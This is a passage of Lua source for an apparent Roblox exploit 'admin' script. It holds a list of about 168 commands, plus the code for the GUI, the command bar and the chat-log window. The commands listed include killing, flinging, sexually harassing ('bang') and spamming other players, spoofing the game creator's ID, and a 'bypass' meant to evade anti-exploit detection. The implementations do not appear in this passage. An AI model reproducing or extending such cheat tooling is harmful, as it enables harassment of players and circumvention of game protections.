- Respawns your character, best for use after FE godmode","25 respawn - Respawns your character, best to use if grespawn fails to work","26 speed // ws [num] - Changes your walkspeed (speed or ws) to [num]","27 jumppower // jp [num] - Changes your jumppower (jumppower or jp) to [num]","28 hipheight // hh [num] - Changes your hipheight (hipheight or hh) to [num]","29 default - Changes your walkspeed, jumppower and hipheight back to normal","30 credits - Displays admin credits (by illremember#3799)","31 attach [plr] - Attaches you to a player, tool required","32 fly / [speed] - Enables fly, optional [speed] for how fast to fly","33 unfly - Disables fly","34 kill [plr] - Kills a player, tool required","35 bring [plr] - Brings a player, tool required","36 naked - Displays avatar body colours","37 nolimbs - Deletes all your arms and legs","38 noarms - Deletes both your arms","39 nolegs - Deletes both your legs","40 antikick [on/off] - Blocks all remotes for antikick when on, disables when off","41 blockremote [remote] / [service] - Blocks a remote from firing, optional [service] for where the remote is located","42 remotespy [on/off] - Prints all remotes to developer console when on when fired, stops printing when off","43 bang [plr] / [speed] - Bangs a player, optional [speed] to set animation adjust speed","44 unbang - Stops bang player","45 spam [msg] - Spams [msg] in chat","46 spamdelay [num] - Sets how long to wait in between spamming","47 unspam - Stops spamming","48 info [plr] - Creates GUI with information about player account, shows Account age, membership and account ID","49 age [plr] - Chats account age of player","50 invisible - Enables FE invisibility, by Timeless","51 walk [plr] - Begins to make you loop walk towards player","52 glitch [plr] / [num] - Glitches a player, tool required, optional [num] for strength of glitch","53 tp [plr] [plr] - Teleports a player to another player, tool required","54 givetool [plr] / [tool] - Gives your current equipped tool to player, optional [tool] to pick a tool by name from your inventory","55 givealltools [plr] - Gives all tools currently equipped and in inventory to player","56 blockhats - Removes mesh of all accessories","57 blocktool - Removes mesh of currently equipped tool","58 orbit [plr] - Begins to make you orbit around a player","59 unorbit - Stops you orbiting a player","60 pos - Shows your current position","61 savepos - Saves your current position","62 loadpos - Loads your current position from savepos","63 tppos [num] [num] [num] - Teleports you to position [num], [num], [num]","64 pmspam [plr] [msg] - Makes you spam a player's pm with [msg]","65 unpmspam - Stops spamming a player's pm","66 wsvis [num] - Changes all parts in workspace to [num] transparency","67 bringobj [obj] / [num] - Brings an object in the workspace to you, optional [num] for how far away to bring object","68 cbring [plr] - Brings a player to you constantly on client","69 uncbring - Stops bringing a player to you on client","70 cfreeze [plr] - Freezes a player on your client","71 uncfreeze / [plr] - Unfreezes a player on your cleint","72 unattach - Unattaches you from a player","73 reach [on/off] / [num] - Activates/Deactivates reach for currently equipped tool, optional [num] for how long the reach should be","74 droptool / [tool] - Drops a tool into the workspace, optional [tool] command for which tool to drop","75 drophats - Drops all your accessories into the workspace","76 hidecmdbar - Hides the command bar","77 showcmdbar - Shows the command bar","78 prefix [key] - Changes your prefix to [key] must be 1 character","79 removeinvis - Removes all invisible parts in workspace","80 removefog - Removes fog in lighting","81 animation [id/gui] / [speed] - Makes you play an animation with [id], optional [speed] for adjusting animation speed OR [gui] to open Energize animation GUI","82 btools - Gives you btools for deleting, copying and dragging (client side)","83 esp [plr] - Enables an esp for that player, credits to Infinite Yield","84 unesp / [plr] - Disables all esp, optional [plr] for disabling esp just for that player","85 dice - Chats you rolling a dice for 1, 2, 3, 4, 5 or 6","86 random [min] [max] - Chats you picking a random number between [min] and [max]","87 closegame - Shutsdown/closes your game","88 savetool / [tool] - Saves a tool to your player equipped, optional [tool] for which tool to save in your inventory","89 loadtool / [tool] - Loads a tool from your player, optional [tool] for which tool to load by name","90 savealltool - Saves all tools in your character/inventory","91 loadalltool - Loads all tools in your player saved tools","92 clicktp / [key] - Enables click teleport, optional [key] to set a key instead of clicking","93 clickdel / [key] - Enables click delete part, optional [key] to set a key instead of clicking","94 unclicktp - Disables clicktp","95 unclickdel - Disables clickdel","96 shutdown - Attempts a server shutdown","97 chatlogs - Opens up a chat log gui with options to print chat to developer console","98 stopadmin - Disables currently running admin completely","99 freecam / [speed] - Enables freecam (like flying but not in character), optional [speed] for how fast the freecam should go","100 unfreecam // unfc - Disables freecam","101 fctp [plr] - Teleports your freecam to player","102 gotofc - Teleports you to current freecam position","103 cmds - Opens up this GUI with commands","104 fullcredits - Shows full individual credits for all help with the admin","105 hotkey [key] [cmd] - Creates a hotkey that executes [cmd] when [key] is pressed","106 removehotkey [key] - Removes a hotkey with [key]","107 removeallhotkey - Removes all current hotkeys for commands","108 printhotkeys - Prints all current existing hotkeys","109 os [plr] - Chats the current OS of a player","110 spin [plr] - Makes you spin with a player, tool required","111 unspin - Stops you spinning a player/teleporting to a player","112 explorer - Loads DEX explorer","113 maxzoom [num] - Changes your maxzoom to number","114 stare [plr] - Makes you stare at another player","115 unstare [plr] - Makes you stop staring at player","116 tempgod - Enables temporary FE godmode, does not work on all games, does not break tools","117 void [plr] - Teleports you and a player to the void, requires a tool","118 freefall [plr] - Makes you and a player freefall to the ground","119 version - Shows current admin's version","120 shiftlockon - Enables shift lock if not enabled by game developer","121 copychat [plr] - Makes you copy the chat player says, use uncopychat to stop copying chat","122 newattach [plr] - Does not FE Godmode you, requires 2 tools, attaches you to player","123 newkill [plr] - Does not FE Godmode you, requires 2 tools, kills player","124 newbring [plr] - Does not FE Godmode you, requires 2 tools, brings player","125 spawn [ws/jp/hh/god] [num] - Sets your walkspeed/jumppower/hipheight to number whenever you respawn, or makes you FE Godded whenever you respawn","126 unspawn - Stops you spawning with stats set by "..commandPrefix.."spawn","127 autosavetool [on/off] - Auto saves your tools when you reset","128 beginbot / [mode] - Makes you a bot for other players, type just "..commandPrefix.."beginbot to print available modes","129 endbot / [mode] - Ends "..commandPrefix.."beginbot, optional [mode] to disable one mode only","130 stopsit - Disables your ability to sit","131 gosit - Enables your ability to sit","132 spawnpoint - Sets your spawnpoint for whenever you reset to where you are","133 nospawn - Removes your spawnpoint","134 chaterror - Creates a chat error, works best first time","135 bypass [on/off] - Changes certain commands like "..commandPrefix.."fly so they are not detected by most anti-exploits", "136 fixcam - Fixes your camera in case it breaks", "137 gotoobj [obj] - Teleports you to a part in the workspace, make sure you put the name properly!", "138 breakcam - Makes it so your camera can go through parts, fixed with "..commandPrefix.."fixcam", "139 inviscam - Makes it so your camera goes through parts and makes them transparent so your character is always visible, fixed with "..commandPrefix.."fixcam", "140 printobj / [key] - Prints the object's path clicked to developer console, optional [key] for key pressed instead of click", "141 unprintobj - Stops printobj from running", "142 hotkeyfc [goto/unfc] - If freecam is set as a hotkey, chooses whether to use unfreecam or gotofc when disabling through a hotkey", "143 carpet [plr] - Makes you a carpet for a player", "144 uncarpet - Stops carpet", "145 brickcreate [num] / [pos] [pos] [pos] - Creates [num] amount of bricks from accessories, wont work in all games, optional [pos] for position to create bricks", "146 uncopychat - Stops copying chat", "147 forward / [speed] - Makes you automatically move forward default speed is 1", "148 unforward - Stops you moving automatically forward from forward", "149 id [plr] - Makes you chat the user ID of the player", "150 spinhats / [pow] - Makes all your accessories begin to spin around! Credit to xFunnieuss.", "151 unspinhats - Stops spinhats from spinning accessories", "152 headless - Makes you headless, but cannot control your character after, use grespawn to reset", "153 savemap - Saves the current workspace/map", "154 loadmap - Loads map saved by savemap", "155 creatorid - Changes your user ID to the game creator's user ID", "156 gameid - Shows the game's ID", "157 delobj [obj] - Allows you to delete an object in the workspace by name", "158 glide [plr] / [speed] - Makes you glide towards a player, optional [speed] for the speed of gliding", "159 stutter [on/off] - Makes your character begin stuttering as you move", "160 platform - Creates a platform on your client that you can stand on, deletes in 20 seconds", "161 servertime - Gets the server time", "162 ride [plr] - Makes you ride a player's head", "163 unride [plr] - Makes you stop riding a player's head", "164 cmute [plr] - Client mutes a player, useful for muting spammers", "165 uncmute - Unmutes a player that has been cmuted", "166 hat [plr] - Makes you carpet a player, but on their head", "167 unhat - Stops hat from running", "168 chat [msg] - Makes you chat a string, useful for hotkeys"}
CMDS={"print [msg]","warn [msg]","sit","god","view [plr]","unview","gravity [num]","ungravity","goto [plr]","fecheck","lockws","unlockws","noclip","clip","follow [plr] / [num]","unfollow","fling [plr] / [pow]","unfling","trail [plr] / [num]","untrail","annoy [plr]","unannoy","reset","grespawn","respawn","speed // ws [num]","jumppower // jp [num]","hipheight // hh [num]","default","credits","attach [plr]","fly / [speed]","unfly","kill [plr]","bring [plr]","naked","nolimbs","noarms","nolegs","antikick [on/off]","blockremote [remote] / [service]","remotespy [on/off]","bang [plr] / [speed]","unbang","spam [msg]","spamdelay [num]","unspam","info [plr]","age [plr]","invisible","walk [plr]","glitch [plr] / [num]","tp [plr] [plr]","givetool [plr] / [tool]","givealltools [plr]","blockhats","blocktool","orbit [plr]","unorbit","pos","savepos","loadpos","tppos [num] [num] [num]","pmspam [plr] [msg]","unpmspam","wsvis [num]","bringobj [obj] / [num]","cbring [plr] / [num]","uncbring","cfreeze [plr]","uncfreeze / [plr]","unattach","reach [on/off] / [num]","droptool / [tool]","drophats","hidecmdbar","showcmdbar","prefix [key]","removeinvis","removefog","animation [id/gui] / [speed]","btools","esp [plr]","unesp / [plr]","dice","random [min] [max]","closegame","savetool / [tool]","loadtool / [tool]","savealltool","loadalltool","clicktp / [key]","clickdel / [key]","unclicktp","unclickdel","oof","chatlogs","stopadmin","freecam / [speed] // fc / [speed]","unfreecam // unfc","gotofc","cmds","fullcredits","hotkey [key] [cmd]","removehotkey [key]","removeallhotkey","printhotkeys","os [plr]","spin [plr]","unspin","fctp [plr]","explorer","maxzoom [num]","stare [plr]","unstare [plr]","tempgod","void [plr]","freefall [plr]","version","shiftlockon","copychat [plr]","newattach [plr]","newkill [plr]","newbring [plr]","spawn [ws/jp/hh/god] [num]","unspawn","autosavetool [on/off]","beginbot / [mode]","endbot / [mode]","stopsit","gosit","spawnpoint","nospawn","chaterror", "bypass [on/off]", "fixcam", "gotoobj [obj]", "breakcam", "inviscam", "printobj / [key]", "unprintobj", "hotkeyfc [goto/unfc]", "carpet [plr]", "uncarpet", "brickcreate [num] / [pos] [pos] [pos]", "uncopychat", "forward / [speed]", "unforward", "id [plr]", "spinhats / [pow]", "unspinhats", "headless", "savemap", "loadmap", "creatorid", "gameid", "delobj [obj]", "glide [plr] / [speed]", "stutter [on/off]", "platform", "servertime", "ride [plr]", "unride", "cmute [plr]", "uncmute", "hat [plr]", "unhat", "chat [msg]"} -- 168
local CMDS_GUI_V2 = Instance.new("ScreenGui")
local CMDSmain = Instance.new("Frame")
local CMDSframemain = Instance.new("Frame")
local cmdgui_topframe = Instance.new("Frame")
local closecmdsgui = Instance.new("TextButton")
local cmdgui_midframe = Instance.new("Frame")
local cmdsgui_SearchFunction = Instance.new("TextBox")
local cmdsgui_searchDETAILFRAME = Instance.new("Frame")
local cmdsgui_searchDETAILTEXT = Instance.new("TextLabel")
local ListofCMDS = Instance.new("ScrollingFrame")
local cmdTutorial = Instance.new("TextLabel")
local cmdTutorial_2 = Instance.new("TextLabel")
local cmdTutorial_3 = Instance.new("TextLabel")
local CMDS_Shadow = Instance.new("Frame")
local CMDS_Shadow2 = Instance.new("Frame")
CMDS_GUI_V2.Name = "CMDS_GUI_V2"
CMDS_GUI_V2.Parent = game.Players.LocalPlayer.PlayerGui
CMDS_GUI_V2.ResetOnSpawn = false
CMDSmain.Name = "CMDSmain"
CMDSmain.Parent = CMDS_GUI_V2
CMDSmain.BackgroundColor3 = Color3.new(1, 1, 1)
CMDSmain.BackgroundTransparency = 1
CMDSmain.Position = UDim2.new(0, 695, 0, 297)
CMDSmain.Size = UDim2.new(0, 440, 0, 367)
CMDSmain.AnchorPoint = Vector2.new(0.5, 0.5)
CMDSmain.Visible = false
CMDSmain.ClipsDescendants = true
CMDSframemain.Name = "CMDSframemain"
CMDSframemain.Parent = CMDSmain
CMDSframemain.BackgroundColor3 = Color3.new(0.309804, 0.309804, 0.309804)
CMDSframemain.BorderSizePixel = 0
CMDSframemain.Size = UDim2.new(0, 440, 0, 367)
cmdgui_topframe.Name = "cmdgui_topframe"
cmdgui_topframe.Parent = CMDSframemain
cmdgui_topframe.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
cmdgui_topframe.BorderSizePixel = 0
cmdgui_topframe.Size = UDim2.new(0, 440, 0, 15)
closecmdsgui.Name = "closecmdsgui"
closecmdsgui.Parent = cmdgui_topframe
closecmdsgui.BackgroundColor3 = Color3.new(1, 1, 1)
closecmdsgui.BackgroundTransparency = 1
closecmdsgui.Position = UDim2.new(0, 410, 0, 0)
closecmdsgui.Size = UDim2.new(0, 30, 0, 15)
closecmdsgui.Font = Enum.Font.SourceSansBold
closecmdsgui.Text = "X"
closecmdsgui.TextColor3 = Color3.new(0.968628, 0.968628, 0.968628)
closecmdsgui.TextSize = 20
cmdgui_midframe.Name = "cmdgui_midframe"
cmdgui_midframe.Parent = CMDSframemain
cmdgui_midframe.BackgroundColor3 = Color3.new(0.14902, 0.14902, 0.14902)
cmdgui_midframe.BorderSizePixel = 0
cmdgui_midframe.Position = UDim2.new(0, 0, 0, 15)
cmdgui_midframe.Size = UDim2.new(0, 440, 0, 45)
cmdsgui_SearchFunction.Name = "cmdsgui_SearchFunction"
cmdsgui_SearchFunction.Parent = cmdgui_midframe
cmdsgui_SearchFunction.BackgroundColor3 = Color3.new(1, 1, 1)
cmdsgui_SearchFunction.BackgroundTransparency = 1
cmdsgui_SearchFunction.BorderSizePixel = 0
cmdsgui_SearchFunction.Position = UDim2.new(0, 120, 0, 10)
cmdsgui_SearchFunction.Size = UDim2.new(0, 200, 0, 25)
cmdsgui_SearchFunction.Font = Enum.Font.SourceSans
cmdsgui_SearchFunction.Text = ""
cmdsgui_SearchFunction.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
cmdsgui_SearchFunction.TextScaled = true
cmdsgui_SearchFunction.TextSize = 14
cmdsgui_SearchFunction.TextWrapped = true
cmdsgui_searchDETAILFRAME.Name = "cmdsgui_searchDETAILFRAME"
cmdsgui_searchDETAILFRAME.Parent = cmdsgui_SearchFunction
cmdsgui_searchDETAILFRAME.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
cmdsgui_searchDETAILFRAME.BorderSizePixel = 0
cmdsgui_searchDETAILFRAME.Position = UDim2.new(0, 0, 0, 25)
cmdsgui_searchDETAILFRAME.Size = UDim2.new(0, 200, 0, 2)
cmdsgui_searchDETAILTEXT.Name = "cmdsgui_searchDETAILTEXT"
cmdsgui_searchDETAILTEXT.Parent = cmdsgui_SearchFunction
cmdsgui_searchDETAILTEXT.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
cmdsgui_searchDETAILTEXT.BackgroundTransparency = 1
cmdsgui_searchDETAILTEXT.Size = UDim2.new(0, 200, 0, 25)
cmdsgui_searchDETAILTEXT.Font = Enum.Font.SourceSansLight
cmdsgui_searchDETAILTEXT.Text = "Search"
cmdsgui_searchDETAILTEXT.TextColor3 = Color3.fromRGB(240, 240, 240)
cmdsgui_searchDETAILTEXT.TextSize = 30
ListofCMDS.Name = "ListofCMDS"
ListofCMDS.Parent = CMDSframemain
ListofCMDS.BackgroundColor3 = Color3.new(0.309804, 0.309804, 0.309804)
ListofCMDS.BorderSizePixel = 0
ListofCMDS.Position = UDim2.new(0, 0, 0, 60)
ListofCMDS.Size = UDim2.new(0, 440, 0, 307)
ListofCMDS.CanvasSize = UDim2.new(5, 0, 8, 0)
ListofCMDS.ScrollingDirection = Enum.ScrollingDirection.XY
cmdTutorial.Name = "cmdTutorial"
cmdTutorial.Parent = ListofCMDS
cmdTutorial.BackgroundColor3 = Color3.new(1, 1, 1)
cmdTutorial.BackgroundTransparency = 1
cmdTutorial.BorderSizePixel = 0
cmdTutorial.Position = UDim2.new(0, 5, 0, 5)
cmdTutorial.Size = UDim2.new(0, 420, 0, 20)
cmdTutorial.Font = Enum.Font.SourceSansBold
cmdTutorial.Text = "\"/\" means OPTIONAL argument after"
cmdTutorial.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
cmdTutorial.TextScaled = true
cmdTutorial.TextSize = 14
cmdTutorial.TextWrapped = true
cmdTutorial.TextXAlignment = Enum.TextXAlignment.Left
cmdTutorial_2.Name = "cmdTutorial"
cmdTutorial_2.Parent = ListofCMDS
cmdTutorial_2.BackgroundColor3 = Color3.new(1, 1, 1)
cmdTutorial_2.BackgroundTransparency = 1
cmdTutorial_2.BorderSizePixel = 0
cmdTutorial_2.Position = UDim2.new(0, 5, 0, 25)
cmdTutorial_2.Size = UDim2.new(0, 420, 0, 20)
cmdTutorial_2.Font = Enum.Font.SourceSansBold
cmdTutorial_2.Text = "\"//\" means another way of running command"
cmdTutorial_2.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
cmdTutorial_2.TextScaled = true
cmdTutorial_2.TextSize = 14
cmdTutorial_2.TextWrapped = true
cmdTutorial_2.TextXAlignment = Enum.TextXAlignment.Left
cmdTutorial_3.Name = "cmdTutorial"
cmdTutorial_3.Parent = ListofCMDS
cmdTutorial_3.BackgroundColor3 = Color3.new(1, 1, 1)
cmdTutorial_3.BackgroundTransparency = 1
cmdTutorial_3.BorderSizePixel = 0
cmdTutorial_3.Position = UDim2.new(0, 5, 0, 45)
cmdTutorial_3.Size = UDim2.new(0, 420, 0, 20)
cmdTutorial_3.Font = Enum.Font.SourceSansBold
cmdTutorial_3.Text = "Anything inside \"[ ]\" is an argument for the command"
cmdTutorial_3.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
cmdTutorial_3.TextScaled = true
cmdTutorial_3.TextSize = 14
cmdTutorial_3.TextWrapped = true
cmdTutorial_3.TextXAlignment = Enum.TextXAlignment.Left
CMDS_Shadow.Name = "CMDS_Shadow"
CMDS_Shadow.Parent = CMDSmain
CMDS_Shadow.BackgroundColor3 = Color3.new(0, 0, 0)
CMDS_Shadow.BackgroundTransparency = 0.60000002384186
CMDS_Shadow.BorderSizePixel = 0
CMDS_Shadow.Position = UDim2.new(0, 2, 0, 2)
CMDS_Shadow.Size = UDim2.new(0, 440, 0, 367)
CMDS_Shadow.ZIndex = -1
CMDS_Shadow2.Name = "CMDS_Shadow2"
CMDS_Shadow2.Parent = CMDSmain
CMDS_Shadow2.BackgroundColor3 = Color3.new(0, 0, 0)
CMDS_Shadow2.BackgroundTransparency = 0.80000001192093
CMDS_Shadow2.BorderSizePixel = 0
CMDS_Shadow2.Position = UDim2.new(0, 5, 0, 5)
CMDS_Shadow2.Size = UDim2.new(0, 440, 0, 367)
CMDS_Shadow2.ZIndex = -1
closecmdsgui.MouseButton1Click:Connect(function()
	CMDSmain:TweenSize(UDim2.new(0, 0, 0, 0), "InOut", "Sine", 2)
end)
function CreateCMDlabel(position, text)
	local sizenow = 15
	local cmdHere = Instance.new("TextLabel")
	cmdHere.Name = "cmdHere"
	cmdHere.TextWrapped = true
	cmdHere.Parent = ListofCMDS
	cmdHere.BackgroundColor3 = Color3.new(1, 1, 1)
	cmdHere.BackgroundTransparency = 1
	cmdHere.BorderSizePixel = 0
	cmdHere.Position = position
	cmdHere.Size = UDim2.new(0, 1950, 0, sizenow)
	cmdHere.Font = Enum.Font.SourceSans
	cmdHere.Text = text
	cmdHere.TextWrapped = true
	cmdHere.TextColor3 = Color3.new(0.956863, 0.956863, 0.956863)
	cmdHere.TextScaled = false
	cmdHere.TextSize = 20
	cmdHere.TextXAlignment = Enum.TextXAlignment.Left
end
for i,_cmds in pairs(searchCmds) do
	CreateCMDlabel(UDim2.new(0, 5, 0, 50 + (i * 15)), _cmds)
end
local UserInputService = game:GetService("UserInputService")
local dragging
local dragInput
local dragStart
local startPos
local function updateCMDS(input)
	local delta = input.Position - dragStart
	local dragTime = 0.055
	local SmoothDrag = {}
	SmoothDrag.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	local dragSmoothFunction = gsTween:Create(CMDSmain, TweenInfo.new(dragTime, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), SmoothDrag)
	dragSmoothFunction:Play()
end
cmdgui_topframe.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = CMDSmain.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)
cmdgui_topframe.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)
cmdgui_midframe.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = CMDSmain.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)
cmdgui_midframe.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		updateCMDS(input)
	end
end)
cmdsgui_SearchFunction.Focused:Connect(function()
	cmdsgui_SearchFunction.TextTransparency = 0
	local searchTween = {}
	searchTween.TextColor3 = Color3.new(0.0980392, 0.462745, 0.823529)
	searchTween.TextSize = 18
	searchTween.Position = UDim2.new(0, -70, 0, -15)
	local frameTweenblue = {}
	frameTweenblue.BackgroundColor3 = Color3.new(0.0980392, 0.462745, 0.823529)
	local searchTween1 = gsTween:Create(cmdsgui_searchDETAILTEXT, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), searchTween)
	searchTween1:Play()
	local frameTweenblue1 = gsTween:Create(cmdsgui_searchDETAILFRAME, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), frameTweenblue)
	frameTweenblue1:Play()
end)
cmdsgui_SearchFunction.FocusLost:Connect(function(enterPressed)
	if not enterPressed then
		cmdsgui_SearchFunction.TextTransparency = 1
	else
		cmdsgui_SearchFunction.Text = " "
	end
	local searchTween = {}
	searchTween.TextColor3 = Color3.fromRGB(240, 240, 240)
	searchTween.TextSize = 30
	searchTween.Position = UDim2.new(0, 0, 0, 0)
	local frameTweenblue = {}
	frameTweenblue.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
	local searchTween1 = gsTween:Create(cmdsgui_searchDETAILTEXT, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), searchTween)
	searchTween1:Play()
	local frameTweenblue1 = gsTween:Create(cmdsgui_searchDETAILFRAME, TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), frameTweenblue)
	frameTweenblue1:Play()
end)
cmdsgui_SearchFunction.Changed:Connect(function()
	local index = 0
	if cmdsgui_SearchFunction.Text ~= "" then
		for i,v in pairs(ListofCMDS:GetChildren()) do
			if v.Name == "cmdHere" then
				if not string.find(v.Text, cmdsgui_SearchFunction.Text) then
					v.Visible = false
				else
					v.Visible = true
					index = index + 1
					v.Position = UDim2.new(0, 5, 0, 50 + (index * 15))
				end
			end
		end
	end
end)

-- Command Execution
LP.Chatted:Connect(function(chat)
	run(chat)
end)

function run(msg)
	if string.lower(string.sub(msg, 2, 5)) == "chat" then
		msg = msg
	elseif string.match(msg, "hotkey") and string.match(msg, "chat") then
		msg = msg
	else
		msg = string.lower(msg)
	end
	local cmdPrefix = string.sub(msg, 1, 1)
	if cmdPrefix == commandPrefix then
		msg = string.sub(msg, 2)
		local args = {}
		for arg in string.gmatch(msg,"[^%s]+") do
			table.insert(args,arg)
		end
		local cmdName = args[1]
		table.remove(args,1)
		local doCmd = Commands[cmdName]
		
		if doCmd ~= nil then
			doCmd(args)
		end
	end
end

-- Command bar
local CommandBar = Instance.new("ScreenGui")
local CMDBAR = Instance.new("Frame")
local CMDBARText = Instance.new("TextBox")
CommandBar.Name = "CommandBar"
CommandBar.Parent = game.Players.LocalPlayer.PlayerGui
CommandBar.ResetOnSpawn = false
CMDBAR.Name = "CMDBAR"
CMDBAR.Parent = CommandBar
CMDBAR.BackgroundColor3 = Color3.new(0.164706, 0.152941, 0.172549)
CMDBAR.BorderSizePixel = 0
CMDBAR.Position = UDim2.new(0.025, 0, 1, 0)
CMDBAR.Size = UDim2.new(0, 270, 0, 35)
CMDBARText.Name = "CMDBARText"
CMDBARText.Parent = CMDBAR
CMDBARText.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
CMDBARText.BorderSizePixel = 0
CMDBARText.Position = UDim2.new(0, 5, 0, 5)
CMDBARText.Size = UDim2.new(0, 260, 0, 25)
CMDBARText.Font = Enum.Font.SourceSansLight
CMDBARText.Text = ""
CMDBARText.TextColor3 = Color3.new(0.933333, 0.933333, 0.933333)
CMDBARText.TextScaled = true
CMDBARText.TextSize = 14
CMDBARText.TextWrapped = true
Mouse.KeyDown:connect(function(Key)
	if Key == string.lower(commandPrefix) then
		CMDBARText:CaptureFocus()
		CMDBAR:TweenPosition(UDim2.new(0.015, 0, 0.95, 0), "Out", "Elastic", 0.5, true)
	end
end)
CMDBARText.FocusLost:connect(function(enterPressed)
	CMDBAR:TweenPosition(UDim2.new(0.015, 0, 1, 0), "Out", "Quad", 0.5, true)
	if enterPressed then
		local cmdmsg = CMDBARText.Text
		CMDBARText.Text = ""
		run(commandPrefix..cmdmsg)
	end
end)
local Match = Instance.new("Frame")
Match.Name = "Match"
Match.Parent = CMDBAR
Match.BackgroundColor3 = Color3.new(0.164706, 0.152941, 0.172549)
Match.BorderSizePixel = 0
Match.Position = UDim2.new(0, 0, -4, 0)
Match.Size = UDim2.new(1, 0, 4, 0)
Match.Visible = false
function CreateOption(Text)
	local Option1 = Instance.new("TextLabel")
	Option1.Name = "Option"
	Option1.Parent = Match
	Option1.BackgroundColor3 = Color3.new(1, 1, 1)
	Option1.BackgroundTransparency = 1
	Option1.Position = UDim2.new(-10, 0, 0, 0)
	Option1.Size = UDim2.new(1, 0, 0, 20)
	Option1.Font = Enum.Font.SourceSans
	Option1.Text = Text
	Option1.TextColor3 = Color3.new(0.952941, 0.952941, 0.952941)
	Option1.TextScaled = true
	Option1.TextWrapped = true
end
for i,cmdtext2 in pairs(CMDS) do
	CreateOption(cmdtext2)
end
CMDBARText.Changed:Connect(function()
	if CMDBARText.Text ~= "" and CMDBARText.Text ~= commandPrefix then
		Match.Visible = true
		local PositionMatch = 0
		for i,cmdtext in pairs(Match:GetChildren()) do
			if cmdtext.Name == "Option" then
				if string.find(cmdtext.Text, CMDBARText.Text) then
					cmdtext.Position = UDim2.new(0, 0, 0, 2 + (PositionMatch * 20))
					PositionMatch = PositionMatch + 1
					if cmdtext.Position == UDim2.new(0, 0, 0, 142) then
						cmdtext.Position = UDim2.new(-10, 0, 0, 0)
						PositionMatch = PositionMatch - 1
					end
				else
					cmdtext.Position = UDim2.new(-10, 0, 0, 0)
				end
			end
		end
	else
		Match.Visible = false
	end
end)

-- Chat
local ChatLogsv2 = Instance.new("ScreenGui")
local MainChatFrame = Instance.new("Frame")
local Framess = Instance.new("Frame")
local CloseChatGUI = Instance.new("TextButton")
local Frame_222 = Instance.new("Frame")
local PrintChat = Instance.new("TextButton")
local Shadow1 = Instance.new("Frame")
local Shadow2 = Instance.new("Frame")
local ScrollingFrame = Instance.new("ScrollingFrame")
ChatLogsv2.Name = "ChatLogsv2"
ChatLogsv2.Parent = game.Players.LocalPlayer.PlayerGui
ChatLogsv2.ResetOnSpawn = false
MainChatFrame.Name = "MainChatFrame"
MainChatFrame.Parent = ChatLogsv2
MainChatFrame.BackgroundColor3 = Color3.new(1, 1, 1)
MainChatFrame.BackgroundTransparency = 1
MainChatFrame.Position = UDim2.new(0, 760, 0, 261)
MainChatFrame.Size = UDim2.new(0, 525, 0, 337)
MainChatFrame.Visible = false
Framess.Parent = MainChatFrame
Framess.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Framess.BorderSizePixel = 0
Framess.Size = UDim2.new(0, 525, 0, 15)
CloseChatGUI.Name = "CloseChatGUI"
CloseChatGUI.Parent = Framess
CloseChatGUI.BackgroundColor3 = Color3.new(1, 1, 1)
CloseChatGUI.BackgroundTransparency = 1
CloseChatGUI.BorderSizePixel = 0
CloseChatGUI.Position = UDim2.new(0, 495, 0, 0)
CloseChatGUI.Size = UDim2.new(0, 30, 0, 15)
CloseChatGUI.Font = Enum.Font.SourceSansBold
CloseChatGUI.Text = "X"
CloseChatGUI.TextColor3 = Color3.new(0.945098, 0.945098, 0.945098)
CloseChatGUI.TextSize = 20
Frame_222.Parent = MainChatFrame
Frame_222.BackgroundColor3 = Color3.new(0.14902, 0.14902, 0.14902)
Frame_222.BorderSizePixel = 0
Frame_222.Position = UDim2.new(0, 0, 0, 15)
Frame_222.Size = UDim2.new(0, 525, 0, 50)
PrintChat.Name = "PrintChat"
PrintChat.Parent = Frame_222
PrintChat.BackgroundColor3 = Color3.new(0.870588, 0.25098, 0.25098)
PrintChat.BorderSizePixel = 0
PrintChat.Position = UDim2.new(0, 15, 0, 0)
PrintChat.Size = UDim2.new(0, 170, 0, 30)
PrintChat.Font = Enum.Font.SourceSansLight
PrintChat.Text = "Print Chat"
PrintChat.TextColor3 = Color3.new(0.960784, 0.960784, 0.960784)
PrintChat.TextSize = 30
PrintChat.TextWrapped = true
Shadow1.Name = "Shadow1"
Shadow1.Parent = MainChatFrame
Shadow1.BackgroundColor3 = Color3.new(0, 0, 0)
Shadow1.BackgroundTransparency = 0.5
Shadow1.Position = UDim2.new(0, 2, 0, 2)
Shadow1.Size = UDim2.new(0, 525, 0, 337)
Shadow1.ZIndex = -1
Shadow2.Name = "Shadow2"
Shadow2.Parent = MainChatFrame
Shadow2.BackgroundColor3 = Color3.new(0, 0, 0)
Shadow2.BackgroundTransparency = 0.80000001192093
